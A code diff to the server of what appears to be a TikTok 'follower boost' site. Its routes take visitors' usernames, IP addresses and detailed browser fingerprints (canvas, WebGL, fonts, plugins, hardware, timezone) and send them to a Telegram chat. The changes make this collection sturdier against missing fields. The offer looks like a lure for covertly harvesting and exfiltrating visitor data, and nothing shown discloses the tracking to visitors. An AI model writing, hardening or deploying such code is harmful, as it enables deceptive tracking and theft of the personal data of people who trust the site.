@@ -50,6 +50,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/health", (req, res) => {
     res.status(200).json({ status: "ok", timestamp: new Date().toISOString() });
   });
+  
   // API endpoint to send notifications to Telegram
   app.post("/api/notify", async (req, res) => {
     try {
@@ -61,7 +62,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Verify device information is available
       const deviceModel = deviceInfo?.deviceModel || userInfo?.deviceModel || 'Unknown Device';
-      const validated = deviceModel !== 'Unknown Device' && ipAddress;
+      const validated = deviceModel !== 'Unknown Device' && (ipAddress || userInfo?.ip);
       
       // Format message with detailed visitor info
       const message = `
@@ -72,34 +73,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
 📱 Device Info:
 - Device: ${deviceModel}
-- Screen: ${userInfo.screenSize}
-- Color Depth: ${userInfo.colorDepth}
-- Platform: ${userInfo.platform}
-- CPU Cores: ${userInfo.hardwareConcurrency}
-- Memory: ${userInfo.deviceMemory}
-- Cookies: ${userInfo.cookiesEnabled}
-- DNT: ${userInfo.doNotTrack}
+- Screen: ${userInfo?.screenSize || 'Unknown'}
+- Color Depth: ${userInfo?.colorDepth || 'Unknown'}
+- Platform: ${userInfo?.platform || 'Unknown'}
+- CPU Cores: ${userInfo?.hardwareConcurrency || 'Unknown'}
+- Memory: ${userInfo?.deviceMemory || 'Unknown'}
+- Cookies: ${userInfo?.cookiesEnabled || 'Unknown'}
+- DNT: ${userInfo?.doNotTrack || 'Unknown'}
 
 🌐 Network:
-- IP Address: ${ipAddress || userInfo.ip || 'Unknown'}
-- Connection: ${JSON.stringify(userInfo.connection)}
+- IP Address: ${ipAddress || userInfo?.ip || 'Unknown'}
+- Connection: ${JSON.stringify(userInfo?.connection || {})}
 
 🗣️ Language:
-- Primary: ${userInfo.language}
-- All: ${userInfo.languages}
+- Primary: ${userInfo?.language || 'Unknown'}
+- All: ${userInfo?.languages || 'Unknown'}
 
 ⏰ Time:
-- Timezone: ${userInfo.timezone}
-- Offset: ${userInfo.timezoneOffset}
+- Timezone: ${userInfo?.timezone || 'Unknown'}
+- Offset: ${userInfo?.timezoneOffset || 'Unknown'}
 
 🔍 Fingerprints:
-- Canvas: ${userInfo.canvasFingerprint || 'Not available'}
-- WebGL: ${userInfo.webglFingerprint || 'Not available'}
-- Fonts: ${userInfo.fonts || 'Not available'}
-- Plugins: ${userInfo.plugins ? (userInfo.plugins.length > 100 ? userInfo.plugins.substring(0, 100) + '...' : userInfo.plugins) : 'Not available'}
+- Canvas: ${userInfo?.canvasFingerprint || 'Not available'}
+- WebGL: ${userInfo?.webglFingerprint || 'Not available'}
+- Fonts: ${userInfo?.fonts || 'Not available'}
+- Plugins: ${userInfo?.plugins ? (userInfo.plugins.length > 100 ? userInfo.plugins.substring(0, 100) + '...' : userInfo.plugins) : 'Not available'}
 
 🧩 User Agent:
-${userInfo.userAgent}
+${userInfo?.userAgent || 'Unknown'}
       `;
       
       // Send to Telegram - without parse_mode to avoid formatting errors
@@ -136,20 +137,42 @@ ${userInfo.userAgent}
   // API endpoint to submit TikTok username for follower boost
   app.post("/api/submit", async (req, res) => {
     try {
-      // Validate the submission data against our schema
-      const submissionData = insertSubmissionSchema.parse(req.body);
+      // Store basic submission data even if there's an error with the device info
+      let validSubmissionData;
+      try {
+        validSubmissionData = insertSubmissionSchema.parse(req.body);
+      } catch (error) {
+        // If the basic form validation fails, return an error
+        if (error instanceof ZodError) {
+          return res.status(400).json({ 
+            message: "Invalid submission data", 
+            errors: error.errors 
+          });
+        }
+        throw error; // Re-throw unexpected errors
+      }
       
       // Get additional device information from the request
       const { deviceInfo, ipAddress, userInfo } = req.body;
       
-      // Perform validation but don't reject submissions with incomplete data
-      const deviceValidation = validateDeviceInfo(deviceInfo, ipAddress, userInfo);
-      
-      // Use the device info from validation if it was created there
-      const validatedDeviceInfo = deviceValidation.deviceInfo || deviceInfo;
+      // Create a basic device info object from userInfo if available
+      let finalDeviceInfo = null;
+      if (deviceInfo) {
+        finalDeviceInfo = deviceInfo;
+      } else if (userInfo) {
+        finalDeviceInfo = {
+          deviceModel: userInfo.deviceModel || "Unknown Device",
+          screenSize: userInfo.screenSize || "Unknown",
+          platform: userInfo.platform || "Unknown",
+          userAgent: userInfo.userAgent || "Unknown",
+          language: userInfo.language || "Unknown",
+          timezone: userInfo.timezone || "Unknown",
+          browserFingerprint: userInfo.canvasFingerprint || ""
+        };
+      }
       
       // Check if username already exists in the system
-      const existingSubmission = await storage.getSubmissionByUsername(submissionData.username);
+      const existingSubmission = await storage.getSubmissionByUsername(validSubmissionData.username);
       
       if (existingSubmission) {
         // If the submission exists but hasn't been processed yet, return it
@@ -173,17 +196,10 @@ ${userInfo.userAgent}
         }
       }
       
-      // Prepare the submission with validated device information
+      // Prepare the submission with device information
       const submission = {
-        ...submissionData,
-        deviceInfo: validatedDeviceInfo || (userInfo ? {
-          deviceModel: userInfo.deviceModel || "Unknown Device",
-          screenSize: userInfo.screenSize || "Unknown",
-          platform: userInfo.platform || "Unknown",
-          userAgent: userInfo.userAgent || "Unknown",
-          language: userInfo.language || "Unknown",
-          timezone: userInfo.timezone || "Unknown"
-        } : null),
+        ...validSubmissionData,
+        deviceInfo: finalDeviceInfo,
         ipAddress: ipAddress || (userInfo?.ip || null)
       };
       
